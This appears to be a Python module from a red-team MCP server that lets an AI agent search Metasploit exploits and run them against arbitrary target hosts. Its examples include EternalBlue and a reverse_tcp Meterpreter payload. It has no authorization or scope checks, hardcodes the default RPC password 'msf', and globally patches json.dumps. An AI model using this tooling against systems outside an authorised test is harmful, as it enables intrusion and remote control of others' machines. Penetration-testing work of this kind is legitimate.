#!/usr/bin/env python3
"""
Metasploit Scanner Module for Red Team MCP

This module provides Metasploit framework integration for exploit discovery and execution.
Uses pymetasploit3 library to communicate with Metasploit RPC server.
"""

import json
import uuid
from datetime import datetime
from typing import Annotated, Dict, List, Optional, Any
import logging

from red_team_mcp import database

logger = logging.getLogger(__name__)

# Global Metasploit client - will be initialized when needed
_msf_client = None

def convert_int_keys_to_str(obj):
    """
    Recursively convert integer keys to strings, ObjectIds to strings, and datetime objects to ISO strings
    in dictionaries to avoid JSON serialization errors.
    This is needed because Metasploit RPC can return data with integer keys, MongoDB returns ObjectIds,
    and database queries can return datetime objects.
    """
    from datetime import datetime

    # Handle ObjectId conversion
    if hasattr(obj, '__class__') and obj.__class__.__name__ == 'ObjectId':
        return str(obj)
    # Handle datetime conversion
    elif isinstance(obj, datetime):
        return obj.isoformat()
    elif isinstance(obj, dict):
        result = {}
        for k, v in obj.items():
            # Convert ObjectId keys to strings
            if hasattr(k, '__class__') and k.__class__.__name__ == 'ObjectId':
                key_str = str(k)
            else:
                key_str = str(k)
            result[key_str] = convert_int_keys_to_str(v)
        return result
    elif isinstance(obj, list):
        return [convert_int_keys_to_str(item) for item in obj]
    else:
        return obj

def format_tool_response(success: bool, data: Dict[str, Any], error: str = "") -> str:
    """Format tool response in consistent JSON format."""
    response = {
        "success": success,
        "timestamp": datetime.now().isoformat(),
        **data
    }
    if error:
        response["error"] = error

    # Convert any integer keys to strings to avoid JSON serialization errors
    response = convert_int_keys_to_str(response)

    return json.dumps(response, indent=2)

def get_metasploit_client():
    """Get or create Metasploit RPC client connection."""
    global _msf_client

    if _msf_client is None:
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            import json

            # Try to patch msgpack which is used by pymetasploit3
            try:
                import msgpack

                # Store original packb function
                original_packb = msgpack.packb

                def patched_packb(obj, **kwargs):
                    """Patched msgpack.packb that converts integer keys to strings."""
                    try:
                        # Convert integer keys before packing
                        converted_obj = convert_int_keys_to_str(obj)
                        return original_packb(converted_obj, **kwargs)
                    except Exception:
                        # Fallback to original if conversion fails
                        return original_packb(obj, **kwargs)

                # Apply the msgpack patch
                msgpack.packb = patched_packb
                print("🔧 DEBUG: Applied msgpack patch for integer keys")

            except ImportError:
                print("⚠️  DEBUG: msgpack not available for patching")

            # Also patch json.dumps as a backup
            original_dumps = json.dumps

            def patched_dumps(obj, **kwargs):
                """Patched json.dumps that converts integer keys to strings."""
                try:
                    # Try the original dumps first
                    return original_dumps(obj, **kwargs)
                except TypeError as e:
                    if "int is not allowed for map key" in str(e) or "keys must be a string" in str(e):
                        # Convert integer keys to strings and try again
                        converted_obj = convert_int_keys_to_str(obj)
                        return original_dumps(converted_obj, **kwargs)
                    else:
                        raise

            # Apply the json patch
            json.dumps = patched_dumps
            print("🔧 DEBUG: Applied JSON patch for integer keys")

            # Default connection parameters - can be made configurable later
            password = "msf"  # Default msfrpcd password
            host = "127.0.0.1"
            port = 55553  # Default msfrpcd port
            ssl = True  # msfrpcd runs with SSL by default

            _msf_client = MsfRpcClient(password, host=host, port=port, ssl=ssl)
            logger.info(f"Connected to Metasploit RPC server at {host}:{port}")

        except ImportError:
            raise Exception("pymetasploit3 library not installed. Install with: pip install pymetasploit3")
        except Exception as e:
            raise Exception(f"Failed to connect to Metasploit RPC server: {str(e)}. "
                          "Make sure msfrpcd is running with: msfrpcd -P msf -a 127.0.0.1")

    return _msf_client

def list_exploits_internal(
    platform: str = "",
    search_term: str = "",
    limit: int = 50
) -> Dict[str, Any]:
    """
    List available Metasploit exploits with optional filtering.

    This function now uses the fast database search instead of slow RPC queries.

    Args:
        platform: Filter by platform (e.g., 'windows', 'linux', 'unix')
        search_term: Search term to filter exploits
        limit: Maximum number of exploits to return

    Returns:
        Dictionary with exploit list and metadata
    """
    try:
        scan_id = str(uuid.uuid4())
        start_time = datetime.now()

        # Create initial scan record
        database.create_scan_record(scan_id, "metasploit-list", "list-exploits", "metasploit", start_time)

        print(f"🚀 DEBUG: Listing exploits using fast database search - platform='{platform}', search='{search_term}', limit={limit}")

        # Check if exploits database is populated
        exploits_count = database.get_exploits_count()
        if exploits_count == 0:
            print("⚠️  WARNING: Exploits database is empty. Run populate_exploits.py first for best results.")
            print("🔄 Falling back to slow RPC method...")

            # Fallback to RPC method if database is empty
            return list_exploits_rpc_fallback(platform, search_term, limit, scan_id, start_time)

        print(f"📊 DEBUG: Using fast database search with {exploits_count} cached exploits")

        # Use the fast database search
        db_result = database.search_exploits_database(
            platform=platform or None,
            search_term=search_term or None,
            cve=None,  # CVE search is handled in search_term
            rank=None,
            author=None,
            limit=limit
        )

        if not db_result["success"]:
            raise Exception(f"Database search failed: {db_result.get('error', 'Unknown error')}")

        # Convert database results to the expected format
        filtered_exploits = []
        for exploit in db_result["exploits"]:
            exploit_info = {
                "name": exploit.get("name", ""),
                "description": exploit.get("description", ""),
                "rank": exploit.get("rank", "Unknown"),
                "author": exploit.get("author", "Unknown"),
                "disclosure_date": exploit.get("disclosure_date"),
                "platform": exploit.get("platform", ""),
                "targets": exploit.get("targets", []),
                "required_options": exploit.get("required_options", []),
                "all_options": exploit.get("all_options", []),
                "references": exploit.get("references", []),
                "cves": exploit.get("cve_references", []),
                "compatible_payloads": exploit.get("compatible_payloads", []),
                "payload_constraints": exploit.get("payload_constraints", []),
                "data_source": exploit.get("data_source", "database")
            }
            filtered_exploits.append(exploit_info)

        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()

        # Store results in database
        results_json = json.dumps({
            "exploits": filtered_exploits,
            "filters": {
                "platform": platform,
                "search_term": search_term,
                "limit": limit
            }
        })

        database.update_scan_status(
            scan_id,
            "completed",
            end_time,
            duration,
            1,
            len(filtered_exploits),
            results_json
        )

        print(f"🎯 DEBUG: Found {len(filtered_exploits)} exploits using fast database search (took {duration:.2f}s)")

        return {
            "success": True,
            "scan_id": scan_id,
            "total_exploits": exploits_count,
            "filtered_exploits": len(filtered_exploits),
            "exploits": filtered_exploits,
            "filters_applied": {
                "platform": platform or "none",
                "search_term": search_term or "none",
                "limit": limit
            },
            "duration_seconds": duration,
            "message": f"Found {len(filtered_exploits)} exploits matching criteria (fast database search)",
            "search_method": "database"
        }

    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "scan_id": scan_id if 'scan_id' in locals() else None
        }


def list_exploits_rpc_fallback(platform: str, search_term: str, limit: int, scan_id: str, start_time) -> Dict[str, Any]:
    """
    Fallback RPC method for listing exploits when database is not populated.
    This is the old slow method kept for compatibility.
    """
    try:
        # Get Metasploit client
        client = get_metasploit_client()

        print(f"🐌 DEBUG: Using slow RPC fallback method...")

        # Get all available exploits
        all_exploits = client.modules.exploits
        print(f"📊 DEBUG: Found {len(all_exploits)} total exploits via RPC")

        # Filter exploits using basic approach
        filtered_exploits = []

        for exploit_name in all_exploits:
            # Basic filtering by platform
            if platform and not exploit_name.lower().startswith(platform.lower()):
                continue

            # Basic filtering by search term
            if search_term and search_term.lower() not in exploit_name.lower():
                continue

            # Create basic exploit info
            exploit_info = {
                "name": exploit_name,
                "description": f"Metasploit exploit module: {exploit_name}",
                "rank": "Unknown",
                "targets": [],
                "required_options": [],
                "all_options": [],
                "references": [],
                "cves": [],
                "data_source": "rpc_fallback"
            }

            filtered_exploits.append(exploit_info)

            # Respect limit
            if len(filtered_exploits) >= limit:
                break

        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()

        # Store results in database
        results_json = json.dumps({
            "exploits": filtered_exploits,
            "filters": {
                "platform": platform,
                "search_term": search_term,
                "limit": limit
            }
        })

        database.update_scan_status(
            scan_id,
            "completed",
            end_time,
            duration,
            1,
            len(filtered_exploits),
            results_json
        )

        print(f"🎯 DEBUG: RPC fallback found {len(filtered_exploits)} exploits (took {duration:.2f}s)")

        return {
            "success": True,
            "scan_id": scan_id,
            "total_exploits": len(all_exploits),
            "filtered_exploits": len(filtered_exploits),
            "exploits": filtered_exploits,
            "filters_applied": {
                "platform": platform or "none",
                "search_term": search_term or "none",
                "limit": limit
            },
            "duration_seconds": duration,
            "message": f"Found {len(filtered_exploits)} exploits matching criteria (RPC fallback - consider populating database)",
            "search_method": "rpc_fallback"
        }

    except Exception as e:
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds() if 'start_time' in locals() else 0

        database.update_scan_status(
            scan_id,
            "failed",
            end_time,
            duration,
            0,
            0,
            "",
            str(e)
        )

        return {
            "success": False,
            "error": str(e),
            "scan_id": scan_id
        }

def execute_exploit_internal(
    exploit_name: str,
    target_host: str,
    target_port: int = None,
    payload: str = "",
    exploit_options: Dict[str, str] = None,
    payload_options: Dict[str, str] = None
) -> Dict[str, Any]:
    """
    Execute a Metasploit exploit against a target.

    Args:
        exploit_name: Name of the exploit module to use
        target_host: Target host IP or hostname
        target_port: Target port (if required by exploit)
        payload: Payload to use (if not specified, will use default)
        exploit_options: Additional exploit options as key-value pairs
        payload_options: Additional payload options as key-value pairs

    Returns:
        Dictionary with execution results
    """
    try:
        scan_id = str(uuid.uuid4())
        start_time = datetime.now()

        # Get Metasploit client
        print(f"🔧 DEBUG: Getting Metasploit client...")
        client = get_metasploit_client()
        print(f"✅ DEBUG: Metasploit client connected")

        # Create initial scan record
        print(f"🔧 DEBUG: Creating scan record...")
        database.create_scan_record(scan_id, target_host, "exploit", "metasploit", start_time)
        print(f"✅ DEBUG: Scan record created")

        print(f"🚀 DEBUG: Executing exploit {exploit_name} against {target_host}")

        # Load the exploit module
        print(f"🔧 DEBUG: Loading exploit module: {exploit_name}")
        try:
            exploit = client.modules.use('exploit', exploit_name)
            if not exploit:
                raise Exception(f"Failed to load exploit module: {exploit_name}")
            print(f"✅ DEBUG: Exploit module loaded successfully")
        except Exception as module_error:
            print(f"❌ DEBUG: Error loading exploit module: {module_error}")
            # Check if it's the integer key error
            if "int is not allowed for map key" in str(module_error):
                print(f"🔧 DEBUG: Detected integer key error in module loading")
                # Try to work around this by catching and re-raising with more context
                raise Exception(f"Metasploit module loading failed due to integer key serialization issue. This is a known issue with the pymetasploit3 library when strict_map_key=True is set in MongoDB. Error: {module_error}")
            else:
                raise module_error

        # Set target host
        exploit['RHOSTS'] = target_host

        # Set target port if provided
        if target_port:
            exploit['RPORT'] = target_port

        # Set additional exploit options
        if exploit_options:
            for key, value in exploit_options.items():
                exploit[key] = value
                print(f"🔧 DEBUG: Set exploit option {key} = {value}")

        # Determine payload
        if not payload:
            # Get available payloads and use the first one
            available_payloads = exploit.targetpayloads()
            if available_payloads:
                payload = available_payloads[0]
                print(f"🎯 DEBUG: Using default payload: {payload}")
            else:
                raise Exception("No compatible payloads found for this exploit")

        # Load payload if specified
        payload_obj = None
        if payload:
            payload_obj = client.modules.use('payload', payload)
            if payload_obj and payload_options:
                for key, value in payload_options.items():
                    payload_obj[key] = value
                    print(f"🔧 DEBUG: Set payload option {key} = {value}")

        # Check for missing required options
        missing_options = exploit.missing_required
        if missing_options:
            raise Exception(f"Missing required exploit options: {missing_options}")

        # Execute the exploit
        print(f"🚀 DEBUG: Launching exploit...")
        result = exploit.execute(payload=payload_obj if payload_obj else payload)

        # Convert result to handle integer keys immediately
        result = convert_int_keys_to_str(result) if result else {}
        print(f"🔧 DEBUG: Exploit execution result: {result}")

        # Check execution result
        job_id = result.get('job_id')
        exploit_uuid = result.get('uuid')

        success = job_id is not None

        # Check for sessions created - handle potential integer keys
        try:
            sessions_raw = client.sessions.list
            sessions = convert_int_keys_to_str(sessions_raw) if sessions_raw else {}
            session_count = len(sessions) if sessions else 0
            print(f"🔧 DEBUG: Sessions found: {session_count}")
        except Exception as session_error:
            print(f"⚠️  DEBUG: Error getting sessions: {session_error}")
            sessions = {}
            session_count = 0

        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()

        # Prepare results
        execution_results = {
            "exploit_name": exploit_name,
            "target_host": target_host,
            "target_port": target_port,
            "payload": payload,
            "job_id": job_id,
            "exploit_uuid": exploit_uuid,
            "sessions_created": session_count,
            "sessions": sessions,
            "execution_result": result
        }

        # Convert integer keys to strings to avoid JSON serialization errors
        execution_results = convert_int_keys_to_str(execution_results)
        results_json = json.dumps(execution_results)

        # Update scan record
        database.update_scan_status(
            scan_id,
            "completed" if success else "failed",
            end_time,
            duration,
            1,
            session_count,
            results_json,
            "" if success else f"Exploit execution failed: {result}"
        )

        print(f"💾 DEBUG: Exploit execution completed - Job ID: {job_id}, Sessions: {session_count}")

        result_dict = {
            "success": success,
            "scan_id": scan_id,
            "exploit_name": exploit_name,
            "target_host": target_host,
            "target_port": target_port,
            "payload": payload,
            "job_id": job_id,
            "exploit_uuid": exploit_uuid,
            "sessions_created": session_count,
            "sessions": sessions,
            "duration_seconds": duration,
            "message": f"Exploit executed against {target_host} - Job ID: {job_id}, Sessions created: {session_count}"
        }

        # Convert integer keys to strings to avoid JSON serialization errors
        return convert_int_keys_to_str(result_dict)

    except Exception as e:
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds() if 'start_time' in locals() else 0

        # Update scan record with error if scan_id exists
        if 'scan_id' in locals():
            database.update_scan_status(
                scan_id,
                "failed",
                end_time,
                duration,
                0,
                0,
                "",
                str(e)
            )

        return {
            "success": False,
            "error": str(e),
            "scan_id": scan_id if 'scan_id' in locals() else None,
            "exploit_name": exploit_name,
            "target_host": target_host
        }

def register_tools(app):
    """Register all Metasploit tools with the FastMCP app."""

    @app.tool()
    async def search_exploits_fast(
        platform: Annotated[str, "Filter by platform (e.g., 'windows', 'linux', 'unix'). Leave empty for all platforms."] = "",
        search_term: Annotated[str, "Search term to filter exploits by name or description. Leave empty for no filtering."] = "",
        cve: Annotated[str, "Search for specific CVE reference (e.g., 'CVE-2017-0144'). Leave empty for no CVE filtering."] = "",
        rank: Annotated[str, "Filter by exploit rank (e.g., 'excellent', 'great', 'good'). Leave empty for all ranks."] = "",
        author: Annotated[str, "Filter by author name. Leave empty for all authors."] = "",
        limit: Annotated[int, "Maximum number of exploits to return"] = 50
    ) -> str:
        """
        Search the cached exploits database for fast results.

        This tool searches a pre-populated database of Metasploit exploits for extremely fast results.
        The database contains detailed information including CVE references, author, disclosure dates, etc.

        Use this tool when you want to:
        - Quickly find exploits by platform, service, or vulnerability
        - Search for exploits by CVE number
        - Filter exploits by rank or author
        - Get fast results without querying Metasploit RPC

        Note: The exploits database must be populated first using the populate_exploits.py script.

        Examples:
        - Windows SMB exploits: platform='windows', search_term='smb'
        - EternalBlue exploit: cve='CVE-2017-0144'
        - High-quality exploits: rank='excellent'
        - Exploits by specific author: author='hdm'
        """
        # Run the blocking database operation in a thread pool
        import asyncio
        result = await asyncio.to_thread(
            database.search_exploits_database,
            platform=platform or None,
            search_term=search_term or None,
            cve=cve or None,
            rank=rank or None,
            author=author or None,
            limit=limit
        )
        # Convert any datetime objects to strings to avoid JSON serialization errors
        result = convert_int_keys_to_str(result)
        return format_tool_response(result["success"], result, result.get("error", ""))

    @app.tool()
    async def list_exploits(
        platform: Annotated[str, "Filter by platform (e.g., 'windows', 'linux', 'unix'). Leave empty for all platforms."] = "",
        search_term: Annotated[str, "Search term to filter exploits by name or description. Leave empty for no filtering."] = "",
        limit: Annotated[int, "Maximum number of exploits to return"] = 50
    ) -> str:
        """
        List available Metasploit exploits with optional filtering.

        This tool connects to the Metasploit RPC server and retrieves a list of available
        exploit modules. Results can be filtered by platform and search terms.

        Use this tool when you want to:
        - Discover available exploits for a specific platform
        - Search for exploits related to specific services or vulnerabilities
        - Get exploit details including required options and targets

        Examples:
        - All Windows exploits: platform='windows', search_term='', limit=50
        - SMB exploits: platform='', search_term='smb', limit=20
        - Apache exploits: platform='linux', search_term='apache', limit=10
        """
        # Run the blocking list_exploits_internal function in a thread pool
        import asyncio
        result = await asyncio.to_thread(list_exploits_internal, platform, search_term, limit)
        return format_tool_response(result["success"], result, result.get("error", ""))

    @app.tool()
    async def execute_exploit(
        exploit_name: Annotated[str, "Name of the exploit module to use (e.g., 'unix/ftp/vsftpd_234_backdoor')"],
        target_host: Annotated[str, "Target host IP address or hostname"],
        target_port: Annotated[int, "Target port number (if required by the exploit)"] = None,
        payload: Annotated[str, "Payload to use (leave empty for default payload)"] = "",
        exploit_options: Annotated[str, "Additional exploit options as JSON string (e.g., '{\"LHOST\": \"192.168.1.100\"}')"] = "{}",
        payload_options: Annotated[str, "Additional payload options as JSON string (e.g., '{\"LPORT\": \"4444\"}')"] = "{}"
    ) -> str:
        """
        Execute a Metasploit exploit against a target host.

        This tool loads and executes a specific Metasploit exploit module against a target.
        It handles payload selection, option configuration, and session management.

        Use this tool when you want to:
        - Execute known exploits against vulnerable targets
        - Test exploit effectiveness in controlled environments
        - Gain access to target systems for further testing

        Examples:
        - Basic exploit: exploit_name='unix/ftp/vsftpd_234_backdoor', target_host='192.168.1.100'
        - With options: exploit_name='windows/smb/ms17_010_eternalblue', target_host='10.0.0.1', target_port=445
        - Custom payload: exploit_name='linux/http/apache_mod_cgi_bash_env_exec', target_host='web.example.com', payload='linux/x86/meterpreter/reverse_tcp'
        """
        try:
            # Parse JSON options
            exploit_opts = json.loads(exploit_options) if exploit_options.strip() else {}
            payload_opts = json.loads(payload_options) if payload_options.strip() else {}
        except json.JSONDecodeError as e:
            return format_tool_response(False, {}, f"Invalid JSON in options: {str(e)}")

        # Run the blocking execute_exploit_internal function in a thread pool
        import asyncio
        result = await asyncio.to_thread(
            execute_exploit_internal,
            exploit_name, target_host, target_port, payload, exploit_opts, payload_opts
        )
        return format_tool_response(result["success"], result, result.get("error", ""))


if __name__ == "__main__":
    # Test the tools directly
    print(list_exploits_internal("windows", "smb", 5))
